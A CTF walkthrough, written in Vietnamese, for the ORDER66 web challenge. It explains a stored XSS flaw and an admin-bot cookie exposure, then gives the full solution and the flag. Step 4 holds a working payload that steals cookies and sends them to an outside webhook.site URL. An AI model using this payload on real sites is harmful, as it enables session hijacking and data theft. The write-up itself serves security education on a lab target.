# 🎯 CTF Walkthrough: ORDER66 — Complete & Verified

**Challenge:** ORDER66 | 100 pts | Easy  
**Platform:** UMass Cybersec CTF  
**URL:** http://order66.web.ctf.umasscybersec.org:32768/  
**Flag:** `UMASS{m@7_t53_f0rce_bS_w!th_y8u}` *(May the force be with you)*  
**Vulnerability:** Stored XSS + Admin Bot Cookie Theft (Puppeteer)

---

## 🗺️ Tổng quan Challenge

Challenge mô phỏng một hệ thống 66 "ORDER" boxes. Người dùng có thể điền nội dung vào các box. Một **admin bot (Puppeteer/headless Chrome)** sẽ visit URL được submit, đem theo **flag trong cookie**, và trang sẽ render một box **không được escape** (vuln_index) → Stored XSS đọc cookie → exfiltrate flag.

```
[Trang chủ] → Grid 66 boxes → POST nội dung vào box
     ↓
[/admin] → Link Checker → gọi /admin/visit
     ↓
[Bot Puppeteer] → set cookie flag=UMASS{...} → visit URL → XSS chạy → gửi flag ra ngoài
```

---

## 📁 Phân tích Source Code

### `compose.yaml` — Biến môi trường
```yaml
environment:
  - PORT=80
  - Host=127.0.0.1
  - FLAG=UMASS{TEST_FLAG}   # flag thật trên server
  - SECRET_KEY=${TEST_KEY}
```

### `app.py` — Logic chính

**1. Hàm tính vuln_index (deterministic):**
```python
def get_grid_context(uid, seed):
    random.seed(seed)               # seed Python random
    v_index = random.randint(1, 66) # vuln_index luôn cố định với cùng seed
    data = {i: (db.get(f"{uid}:box_{i}") or "") for i in range(1, 67)}
    return data, v_index
```

**2. Điều kiện seed cố định (XSS phải ở đúng vuln_index):**
```python
if i == current_vuln_index and ("<script" in content.lower() or "alert(" in content.lower()):
    is_payload_present = True

if not is_payload_present:
    session['seed'] = random.randint(1000, 9999)  # seed thay đổi nếu không có payload
else:
    session['seed'] = current_seed                 # seed giữ nguyên nếu có XSS đúng chỗ
```

**3. /admin/visit — Cách bot được gọi:**
```python
@app.route("/admin/visit", methods=['POST'])
def admin_visit():
    target_url = request.form.get('target_url')
    if not target_url or not target_url.startswith("http://"):
        return "ERROR: Invalid Domain."

    parsed_url = urlparse(target_url)
    internal_target = target_url.replace(parsed_url.netloc, f"web:{PORT}")
    # http://127.0.0.1/view/UID/SEED → http://web:80/view/UID/SEED

    parts = target_url.rstrip('/').split('/')
    target_seed = int(parts[-1])   # seed phải là integer!
    target_uid = parts[-2]

    _, vuln_index = get_grid_context(target_uid, target_seed)

    process = subprocess.run(['node', bot_path, internal_target, str(vuln_index)], ...)
    return process.stdout
```

**4. Template — Box vuln_index render không escape:**
```jinja2
{% if i == vuln_index %}
    {{ content | safe }}   {# ← NGUY HIỂM: raw HTML/JS được render! #}
{% else %}
    {{ content }}          {# safe #}
{% endif %}
```

### `app.js` — Bot Puppeteer đặt cookie flag
```javascript
const FLAG = process.env.FLAG;  // flag thật từ environment

await page.setCookie({
    name: 'flag',
    value: FLAG,
    domain: parsedUrl.hostname,  // 'web' (Docker internal)
    httpOnly: false,             // ← JavaScript CÓ THỂ đọc document.cookie!
    secure: false,
    sameSite: 'Lax'
});

await page.goto(targetUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
await new Promise(r => setTimeout(r, 5000)); // chờ 5s cho script chạy
```

---

## 🚀 Exploit — Từng Bước

### Bước 1 — Lấy user_id và seed

Truy cập trang chủ:
```
http://order66.web.ctf.umasscybersec.org:32768/
```

Xem page source (Ctrl+U) → tìm trong thẻ `<script>`:
```javascript
const bot_uid = "41621314-99f8-431b-88ae-21074f42a3a2";
const bot_seed = "1373";
```

Hoặc xem trong URL log box:
```
http://127.0.0.1/view/YOUR_UID/YOUR_SEED
```

---

### Bước 2 — Tính vuln_index

Chạy Python locally:
```python
import random
seed = 1373  # thay bằng seed của bạn
random.seed(seed)
v_index = random.randint(1, 66)
print(f"vuln_index = {v_index}")
# → vuln_index = 6
```

---

### Bước 3 — Chuẩn bị webhook

Vào [https://webhook.site](https://webhook.site) → copy URL unique:
```
https://webhook.site/YOUR-UNIQUE-ID
```

---

### Bước 4 — Điền XSS payload vào đúng box vuln_index

Trên trang chính, tìm ô **ORDER_6** (vuln_index của bạn), điền vào:
```html
<script>fetch('https://webhook.site/YOUR-UNIQUE-ID?c='+document.cookie)</script>
```

> ⚠️ **Chỉ điền đúng 1 ô (ORDER_6), để trống 65 ô còn lại!**  
> Nếu điền nhiều hơn 1 ô → server trả lỗi `ERROR: Only ONE box allowed.`

Click **"TRANSMIT DATA TO THE CHANCELLOR"** → form POST lưu payload vào Redis.

Sau khi trang reload, ORDER_6 vẫn còn hiện payload → ✅ đã lưu thành công.

---

### Bước 5 — Submit URL vào Link Checker

Click **"Go to the chancellor here"** → vào `/admin`.

Nhập URL (phải dùng `http://` không được `https://`):
```
http://127.0.0.1/view/41621314-99f8-431b-88ae-21074f42a3a2/1373
```

Click **EXECUTE** → chờ ~10 giây.

**Luồng xử lý:**
1. Server parse URL: seed = `1373` ✓, uid = UUID ✓
2. Internal target: `http://web:80/view/UID/1373`
3. Bot Puppeteer visit URL với cookie `flag=UMASS{...}`
4. Trang render ORDER_6 với `| safe` → XSS script chạy
5. `document.cookie` = `flag=UMASS{m@7_t53_f0rce_bS_w!th_y8u}`
6. fetch gửi cookie đến webhook

---

### Bước 6 — Đọc flag

Kết quả hiện ngay trong **console output** của Link Checker (dù CORS block fetch):

```
Access to fetch at 'https://webhook.site/...?c=flag=UMASS{m@7_t53_f0rce_bS_w!th_y8u}'
from origin 'http://web' has been blocked by CORS policy...
```

Flag lộ trong URL dù request bị block!

---

## 🚩 Flag

```
UMASS{m@7_t53_f0rce_bS_w!th_y8u}
```

*"May the force be with you"* — câu nói nổi tiếng từ Star Wars, hoàn toàn phù hợp với ORDER 66!

| Ký tự leet | Nghĩa |
|-----------|-------|
| `m@7` | may |
| `t53` | the |
| `f0rce` | force |
| `bS` | be |
| `w!th` | with |
| `y8u` | you |

---

## 🛡️ Kiến thức rút ra

| Kỹ thuật | Mô tả |
|----------|-------|
| **Stored XSS** | Payload lưu vào DB, chạy khi bot visit |
| **Admin Bot Cookie Theft** | Bot set httpOnly=false cookie → JS đọc được |
| **Puppeteer Bot** | Headless Chrome chạy XSS thật |
| **Jinja2 `\| safe`** | Render không escape → XSS injection |
| **Deterministic vuln_index** | `random.seed(seed)` → tính được vuln_index trước |
| **CORS "leak"** | Flag lộ trong URL ngay cả khi fetch bị block |
